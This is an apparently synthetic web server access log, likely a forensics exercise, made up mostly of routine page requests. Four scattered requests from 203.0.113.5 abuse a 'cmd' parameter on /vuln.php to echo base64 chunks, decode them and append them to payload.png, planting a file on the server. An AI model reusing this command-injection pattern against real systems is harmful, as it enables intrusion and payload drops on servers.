192.168.1.11 - - [02/Sep/2025:22:54:00 +0700] "GET /dashboard.php HTTP/1.1" 200 4661 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:42:34 +0700] "GET /about.php HTTP/1.1" 200 11024 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:12:15 +0700] "GET /checkout.php HTTP/1.1" 200 8044 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:20:50:42 +0700] "GET /images/banner.png HTTP/1.1" 200 1879 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:10:30 +0700] "GET /blog/post3 HTTP/1.1" 200 4206 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:32:42 +0700] "GET /assets/main.js HTTP/1.1" 200 8169 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:44:32 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 2355 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:19:02:43 +0700] "GET /cart.php HTTP/1.1" 200 11823 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:19:15:12 +0700] "GET /news.php?page=2 HTTP/1.1" 200 4850 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:20:19:24 +0700] "GET /favicon.ico HTTP/1.1" 200 2489 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:16:12 +0700] "GET /blog/post3 HTTP/1.1" 200 4907 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:06:36 +0700] "GET /assets/main.js HTTP/1.1" 200 6153 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:20:20:20 +0700] "GET /assets/app.js HTTP/1.1" 200 3166 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:47:08 +0700] "GET /images/banner.png HTTP/1.1" 200 4446 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:59:44 +0700] "GET /cart.php HTTP/1.1" 200 11062 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:21:26:00 +0700] "GET /products.php?id=12 HTTP/1.1" 200 7971 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:24:45 +0700] "GET /dashboard.php HTTP/1.1" 200 1447 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:06:39 +0700] "GET /checkout.php HTTP/1.1" 200 7237 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:37:47 +0700] "GET /assets/style.css HTTP/1.1" 200 10448 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:20:34:10 +0700] "GET /cart.php HTTP/1.1" 200 6610 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:19:55:35 +0700] "GET /sitemap.xml HTTP/1.1" 200 2341 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:15:36 +0700] "GET /about.php HTTP/1.1" 200 10452 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:56:50 +0700] "GET /api/data?id=42 HTTP/1.1" 200 9124 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:20:06:28 +0700] "GET /assets/style.css HTTP/1.1" 200 1985 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:05:23 +0700] "GET /images/banner.png HTTP/1.1" 200 3111 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:41:32 +0700] "GET /about.php HTTP/1.1" 200 3781 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:27:04 +0700] "GET /sitemap.xml HTTP/1.1" 200 3435 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:28:40 +0700] "GET /robots.txt HTTP/1.1" 200 651 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:21:04:45 +0700] "GET /blog/post1 HTTP/1.1" 200 1188 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:23:44 +0700] "GET /checkout.php HTTP/1.1" 200 8945 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:41:13 +0700] "GET /assets/main.js HTTP/1.1" 200 2096 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:15:46 +0700] "GET /cart.php HTTP/1.1" 200 8238 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:58:32 +0700] "GET /assets/main.js HTTP/1.1" 200 11795 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:21:14:28 +0700] "GET /assets/main.js HTTP/1.1" 200 2929 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:49:10 +0700] "GET /blog/post1 HTTP/1.1" 200 5901 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:32:46 +0700] "GET /favicon.ico HTTP/1.1" 200 403 "-" "Bingbot/2.0"
203.0.113.5 - - [02/Sep/2025:19:23:10 +0700] "GET /vuln.php?cmd=echo%20/vN/3htLf3dpbO7aHGvXrI0f/OAHseehPWX7OM1/y/zYfv/2mDd/Xmy/b3v0HuqN48emb6AHmCz79v9FXHhhW3Z2iX/7R/9PyR2Ucj760Y9G911jH74Yspqb06G8ubk5du/ZXcVABOUMDUwwHu7c2h3rb7118HX96vfHsTeOxVcPf7Vk/p1b/W7KmbTnOEHdqiAwAQCTrxAZyh2qxy9OVO/IkSPR963c43HK+e1zz413L333ON9pKlcL1dl8221xsoLuBfOam+OO7q0TOljEVH5+tRKcmN3Gvg8CACZI8cl19pA9HU+8xy5bC9PXdPz8pm0=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.13 - - [02/Sep/2025:21:58:20 +0700] "GET /images/banner.png HTTP/1.1" 200 1153 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:07:51 +0700] "GET /blog/post1 HTTP/1.1" 200 7744 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:22:33:20 +0700] "GET /blog/post3 HTTP/1.1" 200 6722 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:21:10:45 +0700] "GET /assets/app.js HTTP/1.1" 200 4646 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:20:08:51 +0700] "GET /sitemap.xml HTTP/1.1" 200 9765 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:27:06 +0700] "GET /login.php HTTP/1.1" 200 3371 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:20:45:18 +0700] "GET /cart.php HTTP/1.1" 200 8621 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:03:27 +0700] "GET /products.php?id=12 HTTP/1.1" 200 10286 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:21:07:56 +0700] "GET /dashboard.php HTTP/1.1" 200 5929 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:22:32:55 +0700] "GET /blog/post3 HTTP/1.1" 200 787 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:08:40 +0700] "GET /products.php?id=12 HTTP/1.1" 200 9078 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:43:20 +0700] "GET /blog/post2 HTTP/1.1" 200 2096 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:16:56 +0700] "GET /api/data?id=42 HTTP/1.1" 200 9113 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:19:48 +0700] "GET /products.php?id=12 HTTP/1.1" 200 4824 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:00:48 +0700] "GET /assets/style.css HTTP/1.1" 200 6338 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:20:38:32 +0700] "GET /contact.php HTTP/1.1" 200 5849 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:52:04 +0700] "GET /login.php HTTP/1.1" 200 8175 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:21:20:09 +0700] "GET /blog/post2 HTTP/1.1" 200 1837 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:21:28:39 +0700] "GET /dashboard.php HTTP/1.1" 200 7915 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:35:25 +0700] "GET /favicon.ico HTTP/1.1" 200 9797 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:23:07:50 +0700] "GET /api/data?id=42 HTTP/1.1" 200 2124 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:21:06:27 +0700] "GET /favicon.ico HTTP/1.1" 200 11148 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:15:08 +0700] "GET /products.php?id=12 HTTP/1.1" 200 6039 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:28:30 +0700] "GET /news.php?page=2 HTTP/1.1" 200 1783 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:07:14 +0700] "GET /login.php HTTP/1.1" 200 2858 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:36:10 +0700] "GET /cart.php HTTP/1.1" 200 3388 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:53:45 +0700] "GET /news.php?page=2 HTTP/1.1" 200 6715 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:51:40 +0700] "GET /cart.php HTTP/1.1" 200 6324 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:02:05 +0700] "GET /robots.txt HTTP/1.1" 200 10748 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:20:29:15 +0700] "GET /products.php?id=12 HTTP/1.1" 200 6823 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:21:06:10 +0700] "GET /assets/style.css HTTP/1.1" 200 5801 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:55:10 +0700] "GET /sitemap.xml HTTP/1.1" 200 2833 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:22:15:40 +0700] "GET /login.php HTTP/1.1" 200 9083 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:01:26 +0700] "GET /favicon.ico HTTP/1.1" 200 4758 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:20:36 +0700] "GET /blog/post1 HTTP/1.1" 200 10146 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:22:36:00 +0700] "GET /about.php HTTP/1.1" 200 7572 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:32:36 +0700] "GET /assets/main.js HTTP/1.1" 200 11855 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:07:53 +0700] "GET /assets/main.js HTTP/1.1" 200 4574 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:27:33 +0700] "GET /dashboard.php HTTP/1.1" 200 11501 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:24:31 +0700] "GET /robots.txt HTTP/1.1" 200 539 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:33:32 +0700] "GET /api/data?id=42 HTTP/1.1" 200 8553 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:20:05:10 +0700] "GET /assets/style.css HTTP/1.1" 200 9757 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:27:26 +0700] "GET /contact.php HTTP/1.1" 200 2089 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:21:38:05 +0700] "GET /blog/post1 HTTP/1.1" 200 6353 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:21:54:20 +0700] "GET /api/data?id=42 HTTP/1.1" 200 9773 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:22:01:40 +0700] "GET /sitemap.xml HTTP/1.1" 200 3013 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:05:24 +0700] "GET /assets/main.js HTTP/1.1" 200 3476 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:22:18 +0700] "GET /blog/post1 HTTP/1.1" 200 4807 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:56:38 +0700] "GET /sitemap.xml HTTP/1.1" 200 975 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:20:48:51 +0700] "GET /index.php HTTP/1.1" 200 2988 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:22:20:50 +0700] "GET /index.php HTTP/1.1" 200 5406 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:20:56:51 +0700] "GET /about.php HTTP/1.1" 200 11151 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:20:33:48 +0700] "GET /assets/style.css HTTP/1.1" 200 2089 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:20:43:50 +0700] "GET /assets/style.css HTTP/1.1" 200 10227 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:21:14:36 +0700] "GET /api/data?id=42 HTTP/1.1" 200 9001 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:20:06:32 +0700] "GET /about.php HTTP/1.1" 200 6220 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:20:17:20 +0700] "GET /contact.php HTTP/1.1" 200 9489 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:24:39 +0700] "GET /blog/post2 HTTP/1.1" 200 2775 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:20:54:35 +0700] "GET /assets/style.css HTTP/1.1" 200 5697 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:06:38 +0700] "GET /login.php HTTP/1.1" 200 10710 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:20:10:56 +0700] "GET /assets/main.js HTTP/1.1" 200 7896 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:21:54:12 +0700] "GET /blog/post1 HTTP/1.1" 200 6722 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:40:39 +0700] "GET /favicon.ico HTTP/1.1" 200 8726 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:43:40 +0700] "GET /news.php?page=2 HTTP/1.1" 200 10009 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:25:04 +0700] "GET /sitemap.xml HTTP/1.1" 200 10455 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:05:41 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 1954 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:20:21:52 +0700] "GET /dashboard.php HTTP/1.1" 200 4934 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:10:41 +0700] "GET /cart.php HTTP/1.1" 200 920 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:20:34:48 +0700] "GET /images/banner.png HTTP/1.1" 200 6325 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:20:13:15 +0700] "GET /checkout.php HTTP/1.1" 200 600 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:19:40:30 +0700] "GET /assets/main.js HTTP/1.1" 200 5650 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:39:44 +0700] "GET /images/banner.png HTTP/1.1" 200 8054 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:05:12 +0700] "GET /images/banner.png HTTP/1.1" 200 3931 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:47:39 +0700] "GET /blog/post3 HTTP/1.1" 200 6846 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:20:16:57 +0700] "GET /api/data?id=42 HTTP/1.1" 200 4652 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:21:19:06 +0700] "GET /blog/post2 HTTP/1.1" 200 2456 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:10:19 +0700] "GET /login.php HTTP/1.1" 200 3906 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:37:33 +0700] "GET /login.php HTTP/1.1" 200 8626 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:42:36 +0700] "GET /news.php?page=2 HTTP/1.1" 200 3154 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:20:38:12 +0700] "GET /assets/main.js HTTP/1.1" 200 8194 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:21:10:15 +0700] "GET /dashboard.php HTTP/1.1" 200 11136 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:21:50:12 +0700] "GET /contact.php HTTP/1.1" 200 7473 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:38:59 +0700] "GET /blog/post3 HTTP/1.1" 200 8063 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:22:16:12 +0700] "GET /cart.php HTTP/1.1" 200 8136 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:19:47:26 +0700] "GET /assets/style.css HTTP/1.1" 200 8366 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:38:36 +0700] "GET /images/banner.png HTTP/1.1" 200 3030 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:30:15 +0700] "GET /sitemap.xml HTTP/1.1" 200 5217 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:19:16:28 +0700] "GET /checkout.php HTTP/1.1" 200 10076 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:33:25 +0700] "GET /assets/main.js HTTP/1.1" 200 7274 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:04:30 +0700] "GET /login.php HTTP/1.1" 200 7514 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:20:46:45 +0700] "GET /blog/post1 HTTP/1.1" 200 9114 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:20:46:45 +0700] "GET /checkout.php HTTP/1.1" 200 2415 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:21:17:15 +0700] "GET /contact.php HTTP/1.1" 200 6386 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
203.0.113.5 - - [02/Sep/2025:19:23:15 +0700] "GET /vuln.php?cmd=echo%20Uz0AAGau6XhizcwmODE7zZlRF20AAJhgghOzj8AEAECVBCdmF6EJAIAaNPzZn/1ZrF69OhYuXJgtAwAAICIaFi1aFC0tLTF37txsGcwc+jQBADAGhiNn5hOYAGDayY6qlz2cZ8tnh2wtTF/T8fPTx4mZbebsXwAAmEKCEwAA08p0vFtBqel4bVtwYmbSpwkAZhRhiakmODHzCEwAMCOdEaCYQoITM4vQBADABBCcAAAAEkqGI3/srx7LlgNAndJgh2IjNTkY6Xsy0vLTy0jvjhlqir+2o3/fpnjjJoE7TgBMQ6MfvgGYbDN/v1xyx6mvry8=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.13 - - [02/Sep/2025:19:15:37 +0700] "GET /about.php HTTP/1.1" 200 3290 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:21:15:44 +0700] "GET /images/banner.png HTTP/1.1" 200 5777 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:20:02:52 +0700] "GET /about.php HTTP/1.1" 200 3202 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:21:02:33 +0700] "GET /index.php HTTP/1.1" 200 3022 "-" "Edge/18.18363"
203.0.113.5 - - [02/Sep/2025:19:14:00 +0700] "GET /vuln.php?cmd=echo%20Ww4AADDrueMEAACQIDgBAAAkCE4AAAAJghMAAECC4AQAAJAgOAEAACQITgAAAAmCEwAAQILgBAAAkNDw6U9/Ot73vvfFwoULs2UAAABERMOiRYuipaUl5s6dmy0DAAAgIuacddZZZy6++OKIiOjr68uWAwAAzHr6OAEAACQITgAAAAmCEwAAQILgBAAAkCA4AQAAJAhOAAAACYITAABAguAEAACQIDgBAAAkCE4AAAAJghMAAECC4AQAjMnZZ5+dnQUw4whOAAAACYITAABAguAEAACQIDiVcXhjYzQ25l5X7DyaLWbWOBwb89+DjYezZUw=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.12 - - [02/Sep/2025:21:17:24 +0700] "GET /cart.php HTTP/1.1" 200 9934 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:05:16 +0700] "GET /api/data?id=42 HTTP/1.1" 200 1504 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:21:12:35 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 1023 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:35:20 +0700] "GET /api/data?id=42 HTTP/1.1" 200 6222 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:20:46:20 +0700] "GET /login.php HTTP/1.1" 200 6559 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:19:22:28 +0700] "GET /index.php HTTP/1.1" 200 8975 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:21:18:57 +0700] "GET /blog/post2 HTTP/1.1" 200 6483 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:22:06:48 +0700] "GET /assets/style.css HTTP/1.1" 200 6047 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:00:00 +0700] "GET /robots.txt HTTP/1.1" 200 9472 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:14:13 +0700] "GET /about.php HTTP/1.1" 200 2761 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:29:24 +0700] "GET /checkout.php HTTP/1.1" 200 7731 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:20:01:00 +0700] "GET /blog/post3 HTTP/1.1" 200 4020 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:26:10 +0700] "GET /images/banner.png HTTP/1.1" 200 3351 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:29:36 +0700] "GET /blog/post2 HTTP/1.1" 200 11919 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:20:36:46 +0700] "GET /sitemap.xml HTTP/1.1" 200 2740 "-" "Mozilla/5.0"
203.0.113.5 - - [02/Sep/2025:19:04:41 +0700] "GET /vuln.php?cmd=echo%20vOle/9N9+5mJju68YvD41uiLCVAVwanE0dh5RWOs3JudXyy3zOCBx4nRGNVvfR7deVcUvgp7D9bBBk2y3AWEK2J8rx2U+7zL/x+V1X+59fn+QEX2rozGK3ZGmZ8fAGVMcnAqnORsjPKnEfkrtCPtyA9vHHaCNOIVs3LLjrTegqO9caA/IqIztr10Ok6fPh3PbGrLLsUs0bbpjliX//e6VcsypVTvcGxs7Igt/dn55U33+p/u28/M1LbpmTh9+nScPv1Y7vvZfyB6Rz0wAlDQ8KlPfSpWrVoVCxcuzJbVkXygKncraO/KYeHp8MYRlu3fEh0=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.11 - - [02/Sep/2025:20:45:35 +0700] "GET /checkout.php HTTP/1.1" 200 1562 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:20:53:18 +0700] "GET /cart.php HTTP/1.1" 200 7846 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:22:39:10 +0700] "GET /contact.php HTTP/1.1" 200 6800 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:35:11 +0700] "GET /products.php?id=12 HTTP/1.1" 200 10089 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:44:43 +0700] "GET /api/data?id=42 HTTP/1.1" 200 11264 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:20:18:40 +0700] "GET /assets/main.js HTTP/1.1" 200 2842 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:22:41:45 +0700] "GET /api/data?id=42 HTTP/1.1" 200 10057 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:21:44:45 +0700] "GET /favicon.ico HTTP/1.1" 200 10336 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:04:14 +0700] "GET /about.php HTTP/1.1" 200 9010 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:21:41:35 +0700] "GET /images/banner.png HTTP/1.1" 200 9682 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:36:36 +0700] "GET /blog/post1 HTTP/1.1" 200 1994 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:40:06 +0700] "GET /contact.php HTTP/1.1" 200 6952 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:20:21:36 +0700] "GET /products.php?id=12 HTTP/1.1" 200 8627 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:32:18 +0700] "GET /about.php HTTP/1.1" 200 2781 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:10:00 +0700] "GET /blog/post2 HTTP/1.1" 200 11368 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:05:50 +0700] "GET /assets/main.js HTTP/1.1" 200 630 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:20:58:24 +0700] "GET /blog/post3 HTTP/1.1" 200 3795 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:43:24 +0700] "GET /news.php?page=2 HTTP/1.1" 200 8905 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:19:31:51 +0700] "GET /sitemap.xml HTTP/1.1" 200 8078 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:21:34:12 +0700] "GET /favicon.ico HTTP/1.1" 200 833 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:20:38:20 +0700] "GET /products.php?id=12 HTTP/1.1" 200 7387 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:31:06 +0700] "GET /sitemap.xml HTTP/1.1" 200 4301 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:53:36 +0700] "GET /sitemap.xml HTTP/1.1" 200 11494 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:21:24:18 +0700] "GET /robots.txt HTTP/1.1" 200 7327 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:21:52:52 +0700] "GET /favicon.ico HTTP/1.1" 200 10050 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:21:49:32 +0700] "GET /blog/post2 HTTP/1.1" 200 5533 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:19:23:52 +0700] "GET /blog/post3 HTTP/1.1" 200 10007 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:34:18 +0700] "GET /assets/app.js HTTP/1.1" 200 6757 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:30:36 +0700] "GET /favicon.ico HTTP/1.1" 200 3770 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:22:38:30 +0700] "GET /news.php?page=2 HTTP/1.1" 200 1242 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:20:23:00 +0700] "GET /images/banner.png HTTP/1.1" 200 3435 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:02:55 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 10045 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:19:22:24 +0700] "GET /checkout.php HTTP/1.1" 200 10761 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:20:44:45 +0700] "GET /dashboard.php HTTP/1.1" 200 4379 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:21:26:56 +0700] "GET /products.php?id=12 HTTP/1.1" 200 11393 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:04:00 +0700] "GET /contact.php HTTP/1.1" 200 3919 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:05:54 +0700] "GET /sitemap.xml HTTP/1.1" 200 6787 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:20:24:51 +0700] "GET /api/data?id=42 HTTP/1.1" 200 11358 "-" "Safari/537.36"
